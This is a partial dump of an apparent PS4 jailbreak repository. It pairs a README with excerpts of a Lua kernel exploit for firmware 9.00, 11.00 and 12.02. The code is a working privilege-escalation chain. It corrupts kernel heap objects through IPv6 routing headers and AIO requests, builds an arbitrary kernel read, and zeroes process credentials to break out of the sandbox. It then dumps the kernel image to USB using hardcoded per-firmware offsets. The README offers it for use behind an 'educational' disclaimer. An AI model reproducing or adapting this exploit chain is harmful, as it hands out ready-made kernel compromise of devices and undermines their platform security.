@@ -1,0 +1,937 @@
+=== LUA-Lapse tree ===
+README.md
+kpatch/1100.bin
+lapse.lua
+=== relevant source ===
+--- README.md ---
+1-# LUA+Lapse - PS4 Post-Exploitation Framework
+2-
+3:A fork of [remote_lua_loader](https://github.com/shahrilnet/remote_lua_loader) with advanced post-exploitation capabilities for PS4 firmware 11.00 and 12.02.
+4-
+5-> ⚠️ **DISCLAIMER**: This project is for educational and research purposes only. Use at your own risk.
+6-
+7-> 💡 **Note**: If you do not want to dump your kernel, just do not insert a USB device and you can use this exploit for full FTP access only.
+8-
+9-## 🎯 What We've Achieved
+10-
+11-This project implements several advanced kernel exploitation techniques:
+12-
+13-### 1. **Sandbox Escape** 🔓
+--
+18-- Enables access to previously restricted system areas
+19-
+20-### 2. **Kernel Base (KBASE) Discovery** 🔍
+21-
+22-- Implements both static and dynamic methods to find kernel base address
+23-- Uses EVF (Event Flag) string leak for KBASE calculation
+24-
+25-### 3. **Kernel ELF Dumper** 💾
+26-
+27-- Dumps the entire PS4 kernel to USB storage
+28:- Supports large kernel dumps with progress tracking
+29-- Implements chunked reading (16KB blocks) for stability
+30-- Includes real-time progress notifications
+31-
+32-### 4. **Full FTP Access** 📁
+33-
+34-- After running this exploit, the game process is jailbroken
+35-- You can use `ftp_server.lua` from the original remote_lua_loader repo
+36-- Provides full filesystem access via FTP
+37-- No more restrictions on file browsing and transfers
+38-
+--
+43-- ✅ sys_setuid privilege escalation
+44-- ✅ vm_map_protect for RWX mappings
+45-- ✅ sys_dynlib_dlsym with additional patches
+46-- ✅ sys_kexec creation on syscall 11
+47-- ✅ sys_mmap RWX protections
+48-
+49-## 📊 Supported Firmware
+50-
+51-| Firmware | Status    |
+52-| -------- | --------- |
+53:| 12.02    | ✅ Tested |
+54-| 11.00    | ✅ Tested |
+55-| 9.00     |✅ Tested |
+56-
+57:"Thanks to n0llptr for adding 9.00 offsets"
+58-
+59-> 🚧 **Work in Progress**
+60-
+61-## 🎮 How to Use
+62-
+63-### Prerequisites
+64-
+65-1. **A PS4 with supported firmware**
+66-2. **A supported LUA game** (see [remote_lua_loader](https://github.com/shahrilnet/remote_lua_loader) for list)
+67-3. **Remote LUA Loader** setup on your PC
+--
+71-1. Follow the setup instructions from [remote_lua_loader](https://github.com/shahrilnet/remote_lua_loader)
+72-2. Launch your LUA-supported game on PS4
+73-3. Connect using the remote_lua_loader on your PC
+74-4. Send our modified `lapse.lua` file to your PS4
+75-5. The exploit will run automatically
+76-
+77-### After Exploitation
+78-
+79-- Your game process is now jailbroken
+80-- You can send `ftp_server.lua` from the original repo for full FTP access
+81:- USB kernel dumps will be saved to `/mnt/usb0/kernel.elf`
+82-
+83-## 🔧 Technical Details
+84-
+85-### EVF (Event Flag) Constant
+86-
+87-The EVF constant is a kernel string that can be leaked through various vulnerabilities. We use this leak to calculate the kernel base address:
+88-
+89-```
+90:KBASE = leaked_evf_pointer - firmware_specific_evf_offset
+91-```
+92-
+93-### Finding KBASE for Other Firmwares
+94-
+95-The code includes a brute-force scanner that:
+96-
+97-1. Aligns addresses to page boundaries (0x1000)
+98-2. Scans backwards from the leaked pointer
+99-3. Validates findings using:
+100-   - ELF header magic bytes
+101-   - Target ID validation
+102-
+103-### Sandbox Escape Process
+104-
+105-1. **Credential Modification**: Zeros out uid/gid fields in `p_ucred`
+106-2. **Jail Breaking**: Updates process prison pointer to `prison0`
+107-3. **Root Access**: Replaces jail/root directory vnodes with system root vnode
+108-
+109-## 🚀 Features
+110-
+111:- **Automatic Firmware Detection**: Detects running firmware and applies appropriate offsets
+112-- **Robust Error Handling**: Validates operations at each step
+113:- **Progress Notifications**: Real-time updates during kernel dumping
+114:- **USB Dump Support**: Saves kernel dump to `/mnt/usb0/kernel.elf`
+115-- **FTP Compatibility**: Jailbroken process allows full FTP server functionality
+116-
+117-## This project demonstrates:
+118-
+119-- Kernel memory manipulation techniques
+120-- Process privilege escalation methods
+121-- ELF format parsing and validation
+122-- Memory scanning algorithms
+123-- Filesystem jailbreak techniques
+124-
+125-## ⚡ Technical Implementation
+126-
+127-### Key Functions
+128-
+129:1. **`calculate_kbase()`** - Static KBASE calculation using known offsets
+130-2. **`find_kbase()`** - Dynamic KBASE discovery with validation
+131-3. **`escape_sandbox()`** - Implements the jailbreak sequence
+132:4. **`dump_kernel_elf()`** - Handles kernel dumping with progress tracking
+133-5. **`get_kernel_elf_size()`** - Parses ELF headers to determine dump size
+134-
+135-### Memory Layout Understanding
+136-
+137-The exploit relies on understanding PS4's kernel memory layout:
+138-
+139-- Process structures (`curproc`)
+140-- Credential structures (`ucred`)
+141-- File descriptor tables
+142-- Vnode references
+143-
+144-## ⚠️ Important Notes
+145-
+146:- **USB Required**: Kernel dumping requires a FAT32/exFAT formatted USB drive
+147-- **Stability**: This is experimental code - expect potential crashes
+148-
+149-## 📝 Credits
+150-
+151-- Original [remote_lua_loader](https://github.com/shahrilnet/remote_lua_loader) by shahrilnet
+152-- flatz
+153-- null_ptr
+154-- specter
+155-- chendo
+156-- EchoStretch
+157-- al-azif
+158-- SonicPs
+159:- and Everyone who contributed offset documentation
+160-
+161-## 📜 License
+162-
+163-This project is provided as-is for educational purposes. See the original remote_lua_loader repository for base licensing terms.
+--- lapse.lua ---
+745-
+746-function free_rthdrs(sds)
+747-    for _, sd in ipairs(sds) do
+748-        ssockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, 0, 0)
+749-    end
+750-end
+751-
+752-
+753-function make_aliased_rthdrs(sds)
+754-
+755:    local marker_offset = 4
+756-    local size = 0x80
+757-    local buf = memory.alloc(size)
+758-    local rsize = build_rthdr(buf, size)
+759-
+760-    for loop=1,NUM_ALIAS do
+761-
+762-        for i=1, NUM_SDS do
+763:            memory.write_dword(buf + marker_offset, i)
+764-            set_rthdr(sds[i], buf, rsize)
+765-        end
+766-
+767-        for i=1, NUM_SDS do
+768-            get_rthdr(sds[i], buf, size)
+769:            local marker = memory.read_dword(buf + marker_offset):tonumber()
+770-            -- printf("loop[%d] -- sds[%d] = %s", loop, i, hex(marker))
+771-            if marker ~= i then
+772-                local sd_pair = { sds[i], sds[marker] }
+773-                printf("aliased rthdrs at attempt: %d (found pair: %d %d)", loop, sd_pair[1], sd_pair[2])
+774-                table.remove(sds, marker)
+775-                table.remove(sds, i) -- we're assuming marker > i, or else indexing will change
+776-                free_rthdrs(sds)
+777-                for i=1,2 do
+778-                    table.insert(sds, new_socket())
+779-                end
+--
+914-    -- reqs2.ar2_cmd
+915-    if memory.read_dword(addr):tonumber() ~= cmd then
+916-        return false
+917-    end
+918-
+919-    -- heap_prefixes is a array of randomized prefix bits from a group of heap
+920-    -- address candidates. if the candidates truly are from the heap, they must
+921-    -- share a common prefix
+922-    local heap_prefixes = {}
+923-
+924:    -- check if offsets 0x10 to 0x20 look like a kernel heap address
+925-    for i = 0x10, 0x20, 8 do
+926-        if memory.read_word(addr + i + 6):tonumber() ~= 0xffff then
+927-            return false
+928-        end
+929-        table.insert(heap_prefixes, memory.read_word(addr + i + 4):tonumber())
+930-    end
+931-
+932-    -- check reqs2.ar2_result.state
+933-    -- state is actually a 32-bit value but the allocated memory was initialized with zeros.
+934-    -- all padding bytes must be 0 then
+--
+936-    local state2 = memory.read_dword(addr + 0x38 + 4):tonumber()
+937-    if not (state1 > 0 and state1 <= 4) or state2 ~= 0 then
+938-        return false
+939-    end
+940-
+941-    -- reqs2.ar2_file must be NULL since we passed a bad file descriptor to aio_submit_cmd()
+942-    if memory.read_qword(addr + 0x40) ~= uint64(0) then
+943-        return false
+944-    end
+945-
+946:    -- check if offsets 0x48 to 0x50 look like a kernel address
+947-    for i = 0x48, 0x50, 8 do
+948-        if memory.read_word(addr + i + 6):tonumber() == 0xffff then
+949-            -- don't push kernel ELF addresses
+950-            if memory.read_word(addr + i + 4):tonumber() ~= 0xffff then
+951-                table.insert(heap_prefixes, memory.read_word(addr + i + 4):tonumber())
+952-            end
+953:        -- offset 0x48 can be NULL
+954-        elseif (i == 0x50) or (memory.read_qword(addr + i) ~= uint64(0)) then
+955-            return false
+956-        end
+957-    end
+958-
+959-    if #heap_prefixes < 2 then
+960-        return false
+961-    end
+962-
+963-    local first_prefix = heap_prefixes[1]
+--
+1033-    end
+1034-
+1035-    if evf == nil then
+1036-        error("failed to confuse evf and rthdr")
+1037-    end
+1038-
+1039-    -- ip6_rthdr and evf obj are overlapped by now
+1040-    -- enlarge ip6_rthdr by writing to its len field by setting the evf's flag
+1041-    set_evf_flags(evf, bit32.lshift(0xff, 8))
+1042-
+1043:    -- fields we use from evf (number before the field is the offset in hex):
+1044-    -- struct evf:
+1045-    --     0 u64 flags
+1046-    --     28 struct cv cv
+1047-    --     38 TAILQ_HEAD(struct evf_waiter) waiters
+1048-
+1049-    -- evf.cv.cv_description = "evf cv"
+1050-    -- string is located at the kernel's mapped ELF file
+1051-    local kernel_addr = memory.read_qword(buf + 0x28)
+1052-    printf("\"evf cv\" string addr: %s", hex(kernel_addr))
+1053-
+--
+1056-    -- evf.waiters.tqh_last == &evf.waiters.tqh_first
+1057-    --
+1058-    -- we now know the address of the kernel buffer we are leaking
+1059-    local kbuf_addr = memory.read_qword(buf + 0x40) - 0x38
+1060-    printf("kernel buffer addr: %s", hex(kbuf_addr))
+1061-
+1062-    --
+1063-    -- prep to fake reqs3 (aio_batch)
+1064-    --
+1065-
+1066:    local wbufsz = 0x80
+1067:    local wbuf = memory.alloc(wbufsz)
+1068:    local rsize = build_rthdr(wbuf, wbufsz)
+1069-    local marker_val = 0xdeadbeef
+1070:    local reqs3_offset = 0x10
+1071-
+1072-    memory.write_dword(wbuf + 4, marker_val)
+1073:    memory.write_dword(wbuf + reqs3_offset + 0, 1)  -- .ar3_num_reqs
+1074:    memory.write_dword(wbuf + reqs3_offset + 4, 0)  -- .ar3_reqs_left
+1075:    memory.write_dword(wbuf + reqs3_offset + 8, AIO_STATE_COMPLETE)  -- .ar3_state
+1076:    memory.write_byte( wbuf + reqs3_offset + 0xc, 0)  -- .ar3_done
+1077:    memory.write_dword(wbuf + reqs3_offset + 0x28, 0x67b0000)  -- .ar3_lock.lock_object.lo_flags
+1078:    memory.write_qword(wbuf + reqs3_offset + 0x38, 1)  -- .ar3_lock.lk_lock = LK_UNLOCKED
+1079-
+1080-    --
+1081-    -- prep to leak reqs2 (aio_entry)
+1082-    --
+1083-
+1084-    -- 0x80 < num_elems * sizeof(SceKernelAioRWRequest) <= 0x100
+1085-    -- allocate reqs1 arrays at 0x100 malloc zone
+1086-    local num_elems = 6
+1087-
+1088-    -- use reqs1 to fake a aio_info.
+1089:    -- set .ai_cred (offset 0x10) to offset 4 of the reqs2 so crfree(ai_cred) will harmlessly decrement the .ar2_ticket field
+1090-    local ucred = kbuf_addr + 4
+1091-    local leak_reqs = make_reqs1(num_elems)
+1092-    memory.write_qword(leak_reqs + 0x10, ucred)
+1093-
+1094-    local num_loop = NUM_SDS
+1095-    local leak_ids_len = num_loop * num_elems
+1096-    local leak_ids = memory.alloc(4 * leak_ids_len)
+1097-    local step = 4 * num_elems
+1098-    local cmd = bit32.bor(AIO_CMD_WRITE, AIO_CMD_FLAG_MULTI)
+1099-
+--
+1140-            break
+1141-        end
+1142-
+1143-        free_aios(leak_ids, leak_ids_len)
+1144-    end
+1145-
+1146-    if not reqs2_off or not fake_reqs3_off then
+1147-        error("could not leak reqs2 and fake reqs3")
+1148-    end
+1149-
+1150:    printf("reqs2 offset: %s", hex(reqs2_off))
+1151:    printf("fake reqs3 offset: %s", hex(fake_reqs3_off))
+1152-
+1153-    get_rthdr(sd, buf, buflen)
+1154-
+1155-    print("leaked aio_entry:")
+1156-    print(memory.hex_dump(buf + reqs2_off, 0x80))
+1157-
+1158-    -- store for curproc leak later
+1159-    local aio_info_addr = memory.read_qword(buf + reqs2_off + 0x18)
+1160-
+1161-    -- reqs1 is allocated from malloc 0x100 zone, so it must be aligned at 0xff..xx00
+1162-    local reqs1_addr = memory.read_qword(buf + reqs2_off + 0x10)
+1163-    reqs1_addr = bit64.band(reqs1_addr, bit64.bnot(0xff))
+1164-
+1165:    local fake_reqs3_addr = kbuf_addr + fake_reqs3_off + reqs3_offset
+1166-
+1167-    printf("reqs1_addr = %s", hex(reqs1_addr))
+1168-    printf("fake_reqs3_addr = %s", hex(fake_reqs3_addr))
+1169-
+1170-    print("searching target_id")
+1171-
+1172-    local target_id = nil
+1173-    local to_cancel = nil
+1174-    local to_cancel_len = nil
+1175-
+--
+1468-
+1469-    local pktinfo_len = 0x14
+1470-    local pktinfo = memory.alloc(pktinfo_len)
+1471-    memory.write_qword(pktinfo, pktinfo_p)
+1472-
+1473-    local read_buf = memory.alloc(8)
+1474-
+1475-    local function slow_kread8(addr)
+1476-
+1477-        local len = 8
+1478:        local offset = 0
+1479-
+1480:        while offset < len do
+1481-
+1482:            -- pktopts.ip6po_nhinfo = addr + offset
+1483:            memory.write_qword(pktinfo + 8, addr + offset)
+1484-
+1485-            ssockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, pktinfo_len)
+1486:            local n = gsockopt(master_sock, IPPROTO_IPV6, IPV6_NEXTHOP, read_buf + offset, len - offset)
+1487-
+1488-            if n == 0 then
+1489:                memory.write_byte(read_buf + offset, 0)
+1490:                offset = offset + 1
+1491-            else
+1492:                offset = offset + n
+1493-            end
+1494-        end
+1495-
+1496-        return memory.read_qword(read_buf)
+1497-    end
+1498-
+1499-    printf("slow_kread8(&\"evf cv\"): %s", hex(slow_kread8(kernel_addr)))
+1500-    local kstr = memory.read_null_terminated_string(read_buf)
+1501-    printf("*(&\"evf cv\"): %s", kstr)
+1502-
+--
+1506-
+1507-    print("slow arbitrary kernel read achieved")
+1508-
+1509-    -- we are assuming that previously freed aio_info still contains addr to curproc
+1510-    local curproc = slow_kread8(aio_info_addr + 8)
+1511-
+1512-    if bit64.rshift(curproc, 48):tonumber() ~= 0xffff then
+1513-        errorf("invalid curproc kernel address: %s", hex(curproc))
+1514-    end
+1515-
+1516:    local possible_pid = slow_kread8(curproc + kernel_offset.PROC_PID)
+1517-    local current_pid = syscall.getpid()
+1518-
+1519-    if possible_pid.l ~= current_pid.l then
+1520-        errorf("curproc verification failed: %s", hex(curproc))
+1521-    end
+1522-
+1523-    printf("curproc = %s", hex(curproc))
+1524-
+1525-    kernel.addr.curproc = curproc
+1526:    kernel.addr.curproc_fd = slow_kread8(kernel.addr.curproc + kernel_offset.PROC_FD) -- p_fd (filedesc)
+1527:    kernel.addr.curproc_ofiles = slow_kread8(kernel.addr.curproc_fd) + kernel_offset.FILEDESC_OFILES
+1528-    kernel.addr.inside_kdata = kernel_addr
+1529-
+1530-    local function get_fd_data_addr(sock, kread8_fn)
+1531:        local filedescent_addr = kernel.addr.curproc_ofiles + sock * kernel_offset.SIZEOF_OFILES
+1532-        local file_addr = kread8_fn(filedescent_addr + 0x0) -- fde_file
+1533-        return kread8_fn(file_addr + 0x0) -- f_data
+1534-    end
+1535-
+1536-    local function get_sock_pktopts(sock, kread8_fn)
+1537-        local fd_data = get_fd_data_addr(sock, kread8_fn)
+1538:        local pcb = kread8_fn(fd_data + kernel_offset.SO_PCB)
+1539:        local pktopts = kread8_fn(pcb + kernel_offset.INPCB_PKTOPTS)
+1540-        return pktopts
+1541-    end
+1542-
+1543-    local worker_sock = new_socket()
+1544-    local worker_pktinfo = memory.alloc(pktinfo_len)
+1545-
+1546-    -- create pktopts on worker_sock
+1547-    ssockopt(worker_sock, IPPROTO_IPV6, IPV6_PKTINFO, worker_pktinfo, pktinfo_len)
+1548-
+1549-    local worker_pktopts = get_sock_pktopts(worker_sock, slow_kread8)
+--
+1626-    for _, each in ipairs(sock_increase_ref) do
+1627-        local sock_addr = get_fd_data_addr(each, kernel.read_qword)
+1628-        kernel.write_dword(sock_addr + 0x0, 0x100)  -- so_count
+1629-    end
+1630-
+1631-    print("fixes applied")
+1632-end
+1633-
+1634-
+1635-function post_exploitation_ps4()
+1636:    local offsets = {
+1637-        [9.00] = {
+1638:            evf_offset = 0x7F6F27,
+1639-            PRISON0    = 0x111F870,
+1640-            ROOTVNODE  = 0x21EFF20,
+1641:            target_id_offset = 0x221688D
+1642-        },
+1643-        [11.00] = {
+1644:            evf_offset = 0x07FC26F,
+1645-            PRISON0    = 0x0111F830,
+1646-            ROOTVNODE  = 0x02116640,
+1647:            target_id_offset = 0x221C60D
+1648-        },
+1649:        [12.02] = {
+1650:            evf_offset = 0x784798,
+1651-            PRISON0    = 0x0111FA18,
+1652-            ROOTVNODE  = 0x02136E90,
+1653:            target_id_offset = 0x021CC60D
+1654-        }
+1655-    }
+1656-
+1657-    local evf_ptr = kernel.addr.inside_kdata
+1658-    local evf_string = kernel.read_null_terminated_string(evf_ptr)
+1659-    printf("evf string @ %s = %s", hex(evf_ptr), evf_string)
+1660-
+1661-    -- Get current firmware version
+1662-    local fw = tonumber(FW_VERSION:match("%d+%.%d+"))
+1663:    if not offsets[fw] then
+1664-        printf("Unsupported firmware: %s", FW_VERSION)
+1665-        return
+1666-    end
+1667-
+1668-    local evf_ptr = kernel.addr.inside_kdata
+1669-    local evf_string = kernel.read_null_terminated_string(evf_ptr)
+1670-    printf("evf string @ %s = %s", hex(evf_ptr), evf_string)
+1671-
+1672:    -- Calculate KBASE from EVF using table offsets
+1673-    local function calculate_kbase(leaked_evf_ptr)
+1674:        local evf_offset = offsets[fw].evf_offset
+1675:        return leaked_evf_ptr - evf_offset
+1676-    end
+1677-
+1678-    -- ELF validation
+1679-    local function verify_elf_header(kbase)
+1680-        local b0 = kernel.read_byte(kbase):tonumber()
+1681-        local b1 = kernel.read_byte(kbase + 1):tonumber()
+1682-        local b2 = kernel.read_byte(kbase + 2):tonumber()
+1683-        local b3 = kernel.read_byte(kbase + 3):tonumber()
+1684-
+1685-        printf("ELF header bytes at %s:", hex(kbase))
+--
+1691-        if b0 == 0x7F and b1 == 0x45 and b2 == 0x4C and b3 == 0x46 then
+1692-            print("ELF header verified KBASE is valid")
+1693-        else
+1694-            print("ELF header mismatch check base address")
+1695-        end
+1696-    end
+1697-
+1698-    -- Brute scan for ELF with Target ID validation
+1699-    local function find_kbase(leaked_ptr, max_scan)
+1700-        local ELF0, ELF1, ELF2, ELF3 = 0x7F, 0x45, 0x4C, 0x46
+1701:        local static_offset = offsets[fw].evf_offset
+1702:        local static_kbase = leaked_ptr - static_offset
+1703:        local target_id_offset = offsets[fw].target_id_offset
+1704-
+1705:        printf("Static KBASE guess based on EVF offset (0x%X): %s", static_offset, hex(static_kbase))
+1706-
+1707-        local page_size = 0x1000
+1708-        local PAGE_MASK = uint64("0xFFFFFFFFFFFFF000")
+1709-        local aligned_leaked = bit64.band(leaked_ptr, PAGE_MASK)
+1710-        printf(" aligned addr = %s", hex(aligned_leaked))
+1711-
+1712:        for offset = 0, max_scan, page_size do
+1713:            printf(" Scanning offset: 0x%X", offset)
+1714-
+1715:            local addr = aligned_leaked - offset
+1716-            printf("trying addr = %s", hex(addr))
+1717-            local b0 = kernel.read_byte(addr):tonumber()
+1718-            local b1 = kernel.read_byte(addr + 1):tonumber()
+1719-            local b2 = kernel.read_byte(addr + 2):tonumber()
+1720-            local b3 = kernel.read_byte(addr + 3):tonumber()
+1721-
+1722-            if b0 == ELF0 and b1 == ELF1 and b2 == ELF2 and b3 == ELF3 then
+1723-                printf(" Found ELF header at: %s", hex(addr))
+1724-
+1725:                local tid_addr = addr + target_id_offset
+1726-                local tid = kernel.read_byte(tid_addr):tonumber()
+1727-
+1728-                if tid >= 0x80 and tid <= 0x8F then
+1729-                    printf(" Valid Target ID: 0x%02X at %s — confirmed KBASE", tid, hex(tid_addr))
+1730:                    local evf_offset = leaked_ptr - addr
+1731:                    printf(" Hint: static EVF offset for this firmware = %s", hex(evf_offset))
+1732:                    printf(" You can reuse this offset %s next time instead of scanning.", hex(evf_offset))
+1733-                    return addr
+1734-                else
+1735-                    printf(" Target ID check failed (0x%02X) at %s — continuing", tid, hex(tid_addr))
+1736-                end
+1737-            end
+1738-        end
+1739-
+1740-        print(" ELF header not found — fallback to static guess")
+1741-        return static_kbase
+1742-    end
+1743-
+1744-    -- Sandbox escape
+1745-    local function escape_sandbox(kbase, curproc)
+1746:        local PRISON0   = kbase + offsets[fw].PRISON0
+1747:        local ROOTVNODE = kbase + offsets[fw].ROOTVNODE
+1748-
+1749:        local offset_p_fd    = 0x48
+1750:        local offset_p_ucred = 0x40
+1751:        local offset_fd_rdir = 0x10
+1752:        local offset_fd_jdir = 0x18
+1753-
+1754:        local p_fd    = kernel.read_qword(curproc + offset_p_fd)
+1755:        local p_ucred = kernel.read_qword(curproc + offset_p_ucred)
+1756-
+1757-        kernel.write_dword(p_ucred + 0x4, 0)
+1758-        kernel.write_dword(p_ucred + 0x8, 0)
+1759-        kernel.write_dword(p_ucred + 0xC, 0)
+1760-        kernel.write_dword(p_ucred + 0x10, 0)
+1761-
+1762-        local prison0 = kernel.read_qword(PRISON0)
+1763-        kernel.write_qword(p_ucred + 0x30, prison0)
+1764-
+1765-        local rootvnode = kernel.read_qword(ROOTVNODE)
+1766:        kernel.write_qword(p_fd + offset_fd_rdir, rootvnode)
+1767:        kernel.write_qword(p_fd + offset_fd_jdir, rootvnode)
+1768-
+1769-        print("Sandbox escape complete ... root FS access and jail broken")
+1770-    end
+1771-
+1772-
+1773-
+1774:    function dump_kernel_elf(kbase)
+1775-        -- Constants
+1776-        local CHUNK_SIZE = 0x4000              -- 16KB chunks
+1777-        local PROGRESS_INTERVAL = 0x500000     -- Progress update every 5MB
+1778-        local NOTIFICATION_INTERVAL = 10       -- Notification every 10 seconds
+1779:        local OUTPUT_PATH = "/mnt/usb0/kernel.elf"
+1780-        local FILE_PERMISSIONS = tonumber("0777", 8)
+1781-        local BYTES_PER_MB = 1048576
+1782-        local BYTES_PER_KB = 1024
+1783-
+1784-        -- File flags
+1785-        local O_WRONLY = 0x0001
+1786-        local O_CREAT = 0x0200
+1787-        local O_TRUNC = 0x0400
+1788-
+1789-        local fd = nil  -- Track file descriptor for cleanup
+1790-
+1791-        -- Send start notification
+1792:        send_ps_notification("Starting kernel dump...")
+1793-
+1794-        -- Input validation
+1795-        if not kbase or kbase == 0 then
+1796-            local error_msg = "Invalid kernel base address"
+1797-            print(error_msg)
+1798-            send_ps_notification(error_msg)
+1799-            return false
+1800-        end
+1801-
+1802-        -- Resolve necessary syscalls
+--
+1845-        end
+1846-
+1847-        -- Calculate size in MB and start dumping
+1848-        local size_mb = math.floor(kernel_size / BYTES_PER_MB)
+1849-        send_ps_notification(string.format("Dumping %d MB kernel...", size_mb))
+1850-
+1851-        print("Dumping kernel to " .. OUTPUT_PATH)
+1852-        printf("Total size to dump: 0x%X bytes (%d MB)", kernel_size, size_mb)
+1853-
+1854-        -- Dump in chunks
+1855:        local offset = 0
+1856-        local start_time = os.clock()
+1857-        local last_notification_time = start_time
+1858-        local dump_success = false
+1859-
+1860:        while offset < kernel_size do
+1861-            -- Calculate how much to read
+1862:            local to_read = math.min(CHUNK_SIZE, kernel_size - offset)
+1863-
+1864-            -- Read from kernel memory
+1865-            local read_ok, data = pcall(function()
+1866:                local read_addr = kbase + offset
+1867-                return kernel.read_buffer(read_addr, to_read)
+1868-            end)
+1869-
+1870-            if not read_ok or not data then
+1871:                local error_msg = string.format("Kernel read failed at offset 0x%X: %s", offset, tostring(data))
+1872-                print(error_msg)
+1873-                send_ps_notification("Kernel read failed!")
+1874-                break
+1875-            end
+1876-
+1877-            -- Write the data to file
+1878-            local write_result = syscall.write(fd, data, #data)
+1879-            if not write_result then
+1880-                local error_msg = "Write syscall failed"
+1881-                print(error_msg)
+--
+1892-                break
+1893-            end
+1894-
+1895-            if written == 0 then
+1896-                local error_msg = "USB full! Free up space"
+1897-                print(error_msg)
+1898-                send_ps_notification(error_msg)
+1899-                break
+1900-            end
+1901-
+1902:            offset = offset + written
+1903-
+1904-            -- Progress update
+1905:            if offset % PROGRESS_INTERVAL == 0 or offset == kernel_size then
+1906:                local progress_pct = math.floor((offset * 100) / kernel_size)
+1907-                local elapsed = os.clock() - start_time
+1908:                local speed_kbps = math.floor(offset / BYTES_PER_KB / elapsed)
+1909-
+1910-                printf("Progress: 0x%X / 0x%X (%d%%) - Speed: %d KB/s",
+1911:                    offset, kernel_size, progress_pct, speed_kbps)
+1912-
+1913-                -- Send notification every NOTIFICATION_INTERVAL seconds
+1914-                local current_time = os.clock()
+1915-                if current_time - last_notification_time > NOTIFICATION_INTERVAL then
+1916-                    send_ps_notification(string.format("Dumping... %d%%", progress_pct))
+1917-                    last_notification_time = current_time
+1918-                end
+1919-            end
+1920-        end
+1921-
+1922-        -- Check if we completed successfully
+1923:        dump_success = (offset == kernel_size)
+1924-
+1925-        if dump_success then
+1926-            -- Sync to ensure all data is written
+1927-            print("Syncing data to disk...")
+1928-            local sync_result = syscall.fsync(fd)
+1929-            local sync_ok = sync_result and sync_result:tonumber() >= 0
+1930-
+1931-            if not sync_ok then
+1932-                print("Warning: fsync failed - data might not be fully written")
+1933-                send_ps_notification("Warning: sync failed!")
+1934-            end
+1935-
+1936-            -- Final stats
+1937-            local total_time = os.clock() - start_time
+1938:            local avg_speed_kbps = math.floor(offset / BYTES_PER_KB / total_time)
+1939-
+1940-            printf("Dump completed in %d seconds", math.floor(total_time))
+1941:            printf("Successfully dumped 0x%X bytes (%d MB)", offset, math.floor(offset / BYTES_PER_MB))
+1942-            printf("Average speed: %d KB/s", avg_speed_kbps)
+1943-
+1944-            -- Send completion notification with formatted time
+1945-            local completion_msg
+1946-            if total_time < 60 then
+1947:                completion_msg = string.format("Kernel dumped! Time: %d seconds", math.floor(total_time))
+1948-            else
+1949-                local minutes = math.floor(total_time / 60)
+1950-                local seconds = math.floor(total_time - (minutes * 60))
+1951:                completion_msg = string.format("Kernel dumped! Time: %d:%02d", minutes, seconds)
+1952-            end
+1953-
+1954-            send_ps_notification(completion_msg)
+1955-        end
+1956-
+1957-        -- Always close file descriptor if it was opened
+1958-        if fd and fd >= 0 then
+1959-            syscall.close(fd)
+1960-        end
+1961-
+1962-        return dump_success
+1963-    end
+1964-
+1965-
+1966-
+1967-
+1968-    function get_kernel_elf_size(kbase)
+1969:        -- ELF header offsets
+1970:        local E_PHNUM_OFFSET = 0x38  -- Number of program headers
+1971:        local E_PHOFF_OFFSET = 0x40  -- Program header offset (should be 0x40)
+1972-
+1973-        -- Program header entry size
+1974-        local PHDR_SIZE = 0x38
+1975-
+1976-        -- Program types
+1977-        local PT_LOAD = 1
+1978-        local PT_SCE_RELRO = 0x61000000
+1979-
+1980-        -- Read number of program headers
+1981:        local e_phnum = kernel.read_word(kbase + E_PHNUM_OFFSET):tonumber()
+1982-        printf("Number of program headers: %d", e_phnum)
+1983-
+1984-        local end_addr = kbase:tonumber()  -- Convert kbase to number for comparison
+1985-
+1986-        -- Parse each program header
+1987-        for i = 0, e_phnum - 1 do
+1988:            local phdr_offset = E_PHOFF_OFFSET + (i * PHDR_SIZE)
+1989-
+1990:            -- Read p_type (4 bytes at offset 0x00)
+1991:            local p_type = kernel.read_dword(kbase + phdr_offset):tonumber()
+1992-
+1993-            -- Only process PT_LOAD and PT_SCE_RELRO segments
+1994-            if p_type == PT_LOAD or p_type == PT_SCE_RELRO then
+1995-                -- Read segment details and convert to numbers
+1996:                local p_vaddr = kernel.read_qword(kbase + phdr_offset + 0x10):tonumber()
+1997:                local p_memsz = kernel.read_qword(kbase + phdr_offset + 0x28):tonumber()
+1998:                local p_align = kernel.read_qword(kbase + phdr_offset + 0x30):tonumber()
+1999-
+2000-                -- Calculate aligned end address
+2001-                local segment_end = p_vaddr + p_memsz
+2002-
+2003-                -- Apply alignment (next_multiple_of)
+2004-                if p_align > 0 then
+2005-                    local remainder = segment_end % p_align
+2006-                    if remainder ~= 0 then
+2007-                        segment_end = segment_end + (p_align - remainder)
+2008-                    end
+--
+2025-
+2026-
+2027-
+2028-    -- Run post-exploit logic
+2029-    local proc = kernel.addr.curproc
+2030-    local kbase = calculate_kbase(evf_ptr)
+2031-    --find_kbase(evf_ptr, 0x1E00000)
+2032-    printf("KERNEL BASE CANDIDATE: %s", hex(kbase))
+2033-    verify_elf_header(kbase)
+2034-    escape_sandbox(kbase, proc)
+2035:    dump_kernel_elf(kbase)
+2036-
+2037-end
+2038-
+2039-
+2040-function post_exploitation_ps5()
+2041-
+2042:    -- if we havent found allproc, assume we havent found every kernel offsets yet for this fw
+2043:    if not kernel_offset.DATA_BASE_ALLPROC then
+2044-        printf("fw not yet supported for jailbreaking")
+2045-        return
+2046-    end
+2047-
+2048:    local OFFSET_UCRED_CR_SCEAUTHID = 0x58
+2049:    local OFFSET_UCRED_CR_SCECAPS = 0x60
+2050:    local OFFSET_UCRED_CR_SCEATTRS = 0x83
+2051:    local OFFSET_P_UCRED = 0x40
+2052-
+2053-    local KDATA_MASK = uint64("0xffff804000000000")
+2054-
+2055-    local SYSTEM_AUTHID = uint64("0x4800000000010003")
+2056-
+2057-    local function find_allproc()
+2058-
+2059-        local proc = kernel.addr.curproc
+2060-        local max_attempt = 32
+2061-
+2062-        for i=1,max_attempt do
+2063-            if bit64.band(proc, KDATA_MASK) == KDATA_MASK then
+2064:                local data_base = proc - kernel_offset.DATA_BASE_ALLPROC
+2065-                if bit32.band(data_base.l, 0xfff) == 0 then
+2066-                    return proc
+2067-                end
+2068-            end
+2069-            proc = kernel.read_qword(proc + 0x8)  -- proc->p_list->le_prev
+2070-        end
+2071-
+2072-        error("failed to find allproc")
+2073-    end
+2074-
+2075-    local function get_dmap_base()
+2076-
+2077-        assert(kernel.addr.data_base)
+2078-
+2079:        local OFFSET_PM_PML4 = 0x20
+2080:        local OFFSET_PM_CR3 = 0x28
